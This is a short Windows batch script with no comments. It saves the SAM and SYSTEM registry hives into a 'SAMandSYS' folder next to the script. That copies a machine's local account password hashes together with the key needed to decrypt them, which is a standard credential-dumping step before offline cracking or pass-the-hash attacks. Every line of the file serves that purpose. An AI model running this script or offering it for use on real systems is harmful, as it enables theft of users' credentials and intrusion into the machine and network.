set "str1=%~dp0"
set "str2=SAMandSYS"
set "strpath=%str1%%str2%"
reg save hklm\sam %strpath%\sam
reg save hklm\system %strpath%\system
pause